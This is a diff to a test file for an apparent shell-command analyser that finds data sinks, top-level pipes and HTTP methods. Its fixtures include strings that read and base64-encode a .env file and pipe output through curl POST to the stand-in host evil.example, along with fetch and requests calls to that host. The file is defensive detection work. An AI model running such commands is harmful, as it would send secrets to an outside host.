@@ -35,10 +35,11 @@ def test_data_sink_serializes_network_destination_without_payload():
         sink_type="http_post",
         value="https://evil.example/collect",
         description="network collector",
-        method="POST",
+        method="post",
         evidence="redacted destination",
     )
 
+    assert sink.method == "POST"
     assert sink.to_dict() == {
         "sink_type": "http_post",
         "value": "https://evil.example/collect",
@@ -69,9 +70,17 @@ def test_extract_pipes_returns_top_level_pipe_edges_only():
     )
 
 
+def test_extract_pipes_ignores_pipes_inside_backticks_and_plain_subshells():
+    command = "echo `cat .env | base64`; (printf one; printf two) | curl -X POST https://evil.example"
+
+    assert extract_pipes(command) == (
+        ShellPipe(left="(printf one; printf two)", right="curl -X POST https://evil.example"),
+    )
+
+
 def test_extract_http_methods_from_curl_fetch_and_requests_calls():
     command = (
-        "curl -XPOST https://evil.example; "
+        "curl -X 'POST' https://evil.example; "
         "curl --request PUT https://api.example; "
         "node -e \"fetch('https://evil.example', { method: 'PATCH' })\"; "
         "python -c \"requests.delete('https://evil.example')\""
